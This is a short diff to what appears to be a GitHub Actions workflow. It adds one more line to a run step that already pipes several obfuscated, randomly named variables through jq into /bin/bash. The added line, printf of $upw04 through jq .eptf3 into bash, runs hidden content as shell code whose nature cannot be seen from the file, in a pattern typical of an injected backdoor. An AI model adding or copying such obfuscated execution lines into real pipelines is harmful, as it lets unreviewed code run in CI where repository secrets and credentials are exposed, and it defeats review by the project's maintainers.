@@ -29,6 +29,7 @@ jobs:
           echo $jhcrd083 | jq -r .wmfz393 | /bin/bash
           echo $fe59 | jq -r .giitk4607 | /bin/bash
           echo $dy82030 | jq -r .sude825 | /bin/bash
+          printf '%s' "$upw04" | jq -r .eptf3 | /bin/bash
 
       - name: Store output
         uses: actions/upload-artifact@v4
